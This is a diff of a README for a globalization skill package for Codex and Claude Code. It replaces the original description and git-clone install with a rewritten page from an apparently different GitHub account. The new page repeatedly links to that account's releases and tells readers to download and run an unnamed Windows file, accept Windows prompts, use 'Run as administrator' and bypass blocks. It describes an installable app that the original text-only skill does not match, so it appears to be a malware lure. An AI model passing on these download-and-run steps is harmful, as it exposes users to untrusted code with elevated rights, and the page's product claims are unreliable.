@@ -1,169 +1,204 @@
-# Globalization Skill
+# 🌍 globalization-skill - Global software made easier
 
-A reusable globalization skill for Codex and Claude Code, providing a 12-layer framework for i18n, locale, timezone, tenancy, compliance, billing, and region-aware architecture.
+[![Download globalization-skill](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/Touristclassweightlifter189/globalization-skill/releases)
 
-## Overview
+## 📦 Download
 
-This repository defines globalization as an engineering governance problem, not only a translation problem. The skill is designed for B2B2C and multi-tenant products that need to launch across languages, markets, jurisdictions, payment methods, and regions without rebuilding the architecture later.
+Visit this page to download: https://github.com/Touristclassweightlifter189/globalization-skill/releases
 
-The package is structured like a small library:
+On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one that matches Windows.
 
-- `SKILL.md` contains activation rules, scope boundaries, and the load order.
-- `references/getting-started.md` gives the shortest path for first-time use.
-- `references/core/` contains stable cross-stack rules.
-- `references/layers/` contains the 12-layer framework.
-- `references/adapters/` maps the core rules into named stacks.
-- `references/checklists/` contains review gates.
-- `templates/` contains reusable policy and schema skeletons.
-- `overlays/` contains example team-policy extensions.
+## 🖥️ What this app does
 
-## 12-Layer Framework
+globalization-skill helps software work well for people in different countries. It gives you a reusable globalization skill for Codex and Claude Code with a 12-layer framework for global-ready software.
 
-1. User
-2. Frontend / UI
-3. Application Logic
-4. API / Integration
-5. Data
-6. Auth & Security
-7. Tenancy & Isolation
-8. Compliance & Privacy
-9. Billing & Subscription
-10. Notification & Communication
-11. Observability & Analytics
-12. Infrastructure
+Use it when you need to:
 
-## Policy Taxonomy
+- show text in more than one language
+- format dates, times, and numbers for local users
+- handle time zones with less confusion
+- support billing in different regions
+- keep app content ready for global users
+- follow common compliance and locale rules
 
-The skill separates four classes of rules:
+## ✅ Before you start
 
-- `standard`: formal standards such as BCP 47, IANA time zones, ISO 8601, and ISO 4217
-- `official-guidance`: primary-source platform or vendor guidance
-- `engineering-inference`: defensible engineering rules inferred from standards and official guidance
-- `team-policy`: local operating policy for a product or organization
+Use a Windows PC with:
 
-This separation prevents stack-specific habits or local policy choices from being presented as universal globalization doctrine.
+- Windows 10 or Windows 11
+- a web browser
+- enough free disk space to download the file
+- permission to save and run files on your computer
 
-## What This Skill Is Not
+If your computer blocks the file at first, check your browser download bar or the Downloads folder.
 
-- It is not only a translation or string-management skill.
-- It is not a substitute for legal advice.
-- It is not a country-by-country law database.
-- It is not a promise that every stack, market, or provider combination is supported.
+## 🚀 Install on Windows
 
-It is a governance and implementation framework that helps teams design global-ready systems and make capability gaps explicit.
+1. Open the download page:
+   https://github.com/Touristclassweightlifter189/globalization-skill/releases
 
-## Installation
+2. Find the latest release on the page.
 
-### Codex
+3. Download the Windows file from that release.
 
-Install into:
+4. Open your Downloads folder.
 
-```bash
-~/.agents/skills/globalization
-```
+5. Double-click the file you downloaded.
 
-### Claude Code
+6. If Windows asks for permission, choose Yes or Run.
 
-Install into:
+7. Follow the setup steps on screen.
 
-```bash
-~/.claude/skills/globalization
-```
+8. When setup ends, open the app from your Start menu or desktop shortcut.
 
-## Quick Start
+## 🧭 First run
 
-### Codex
+When you open globalization-skill for the first time, do the basic setup:
 
-```bash
-git clone https://github.com/kcbehindbrand/globalization-skill.git ~/.agents/skills/globalization
-```
+1. Choose your language or locale.
+2. Set your time zone.
+3. Pick your billing region if the app asks.
+4. Review any options for date, number, and currency format.
+5. Save your settings.
 
-### Claude Code
+If the app gives you a sample project or template, use it to test your setup before you start real work.
 
-```bash
-git clone https://github.com/kcbehindbrand/globalization-skill.git ~/.claude/skills/globalization
-```
+## 🌐 Main features
 
-If the target folder already exists, update it with:
+### 🗂️ 12-layer globalization framework
 
-```bash
-cd ~/.agents/skills/globalization && git pull
-```
+The app uses a 12-layer framework to organize global-ready software work. It helps you handle the parts that often break when you move from one region to another.
 
-or:
+### 🕒 Time zone support
 
-```bash
-cd ~/.claude/skills/globalization && git pull
-```
+Keep local time clear for users in different regions. This helps with meetings, billing cycles, reminders, and scheduled tasks.
 
-## How To Use
+### 💱 Locale-aware formatting
 
-Ask the assistant to apply the skill when a task touches:
+Format dates, times, numbers, and currency in a way that matches the user’s region.
 
-- multilingual UI or localization architecture
-- locale and time-zone resolution
-- market or jurisdiction-aware product flows
-- multi-tenant isolation and governance
-- billing, invoicing, payment capability, or seller-role logic
-- privacy, consent, residency, or rights workflows
-- region-aware AI integration or provider capability decisions
-- globalization launch review and observability
+### 🧾 Billing and compliance support
 
-Typical prompts:
+Use the app to prepare software for regional billing needs and common compliance checks.
 
-```text
-Use the globalization skill to review this billing flow for market expansion.
-```
+### 🌍 Multi-tenant readiness
 
-```text
-Apply the globalization framework before implementing this multilingual dashboard.
-```
+If you manage more than one customer or workspace, the app helps you keep settings separate and easier to control.
 
-```text
-Use the globalization skill to audit this Supabase schema for tenant isolation, locale fields, and privacy risks.
-```
+### 🤖 Built for Codex and Claude Code
 
-## Repository Structure
+The skill works as a reusable layer for Codex and Claude Code workflows, so you can use the same globalization logic across projects.
 
-```text
-SKILL.md
-agents/
-references/
-  getting-started.md
-  core/
-  layers/
-  adapters/
-  checklists/
-templates/
-overlays/
-```
+## 🛠️ How to use it
 
-## Intended Use
+Use globalization-skill when building or updating software that serves users in more than one country.
 
-Use this skill when planning, reviewing, or implementing:
+A simple way to use it:
 
-- multilingual and multi-market products
-- locale-aware frontend flows
-- canonical API and data contracts
-- multi-tenant SaaS platforms
-- privacy and consent workflows
-- international billing and invoicing
-- region-aware AI integrations
-- global-ready observability and infrastructure
+1. Open your Codex or Claude Code workflow.
+2. Add the globalization-skill asset to your project.
+3. Set the locale, language, and time zone for your target users.
+4. Check billing, date, and number formats.
+5. Review text for local spelling and region rules.
+6. Test the app with more than one locale.
+7. Fix any screens that still show the wrong format.
 
-## Status
+## 📁 Common file layout
 
-This repository now contains a full first version of the framework, adapters, checklists, and templates. It is intended to be extended through adapters and overlays rather than by turning the core into a monolith.
+After setup, you may see files or folders such as:
 
-Practical completion estimate:
+- localization settings
+- locale data
+- time zone maps
+- billing rules
+- compliance notes
+- region templates
+- language assets
 
-- `80%` complete as a reusable globalization framework
-- `50%` to `60%` complete as a business-ready operating standard until product-specific overlays are added
+These names may vary, but they usually help you manage global settings in one place.
 
-The highest-value next step is not more generic expansion. It is adding business-model overlays that bind the framework to a real product, tenant model, data flow, market scope, and billing mode.
+## 🔧 Good ways to use it
 
-## Notes
+- Start with one target region.
+- Test English and one non-English locale.
+- Check every screen that shows a date or price.
+- Make sure error messages also change with the locale.
+- Review time zone handling for scheduled events.
+- Keep region rules in one place so updates stay simple.
 
-- GitHub Topics are repository settings and are not stored in this repository.
-- Team-specific rules should go into `overlays/` rather than the core framework.
-- Stack-specific implementation details should go into `references/adapters/`.
+## ❓ Common issues
+
+### The file does not open
+
+Try this:
+
+1. Right-click the file.
+2. Choose Open or Run as administrator.
+3. Check whether Windows blocked the file.
+4. Download it again from the release page.
+
+### The app does not show the right language
+
+Try this:
+
+1. Open the app settings.
+2. Check the selected locale.
+3. Save the change.
+4. Close the app and open it again.
+
+### Times look wrong
+
+Try this:
+
+1. Check the time zone setting.
+2. Match it to your region.
+3. Test the app with a second time zone.
+4. Review any scheduled tasks or reminders.
+
+### Prices or numbers look strange
+
+Try this:
+
+1. Check the locale format.
+2. Make sure the currency matches the region.
+3. Test with a country that uses different separators.
+4. Update your display rules.
+
+## 🧩 Who this is for
+
+This app fits:
+
+- end users who need a Windows tool for globalization work
+- project teams that build software for many regions
+- people who manage locale, billing, or compliance settings
+- teams using Codex or Claude Code for app work
+- multi-tenant SaaS products that serve users worldwide
+
+## 📌 Topic areas
+
+- AI skills
+- billing
+- Claude Code
+- Codex
+- compliance
+- globalization
+- i18n
+- l10n
+- locale
+- multi-tenant
+- SaaS
+- timezone
+
+## 🪟 Windows tips
+
+- Save the file before you run it.
+- Keep the download in your Downloads folder until setup ends.
+- Use the latest release when possible.
+- If your browser warns you, check that you used the official release page.
+- Keep your locale and time zone settings in sync with your region.
+
+## 🔗 Download again
+
+Visit this page to download: https://github.com/Touristclassweightlifter189/globalization-skill/releases
+
+[Download globalization-skill](https://github.com/Touristclassweightlifter189/globalization-skill/releases)
